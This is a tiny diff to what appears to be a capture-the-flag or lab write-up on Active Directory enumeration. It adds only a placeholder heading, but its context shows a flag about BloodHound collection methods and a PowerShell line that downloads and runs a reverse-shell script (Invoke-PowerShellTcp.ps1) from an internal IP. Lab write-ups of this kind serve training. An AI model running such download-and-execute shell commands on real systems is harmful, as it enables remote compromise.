@@ -166,3 +166,4 @@ powershell.exe iex (iwr http://172.16.99.115/Invoke-PowerShellTcp.ps1 -UseBasicP
 
 ### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**
 Launch sharpound on the student vm and export it to kali to use bloodhound
+### **titolo**
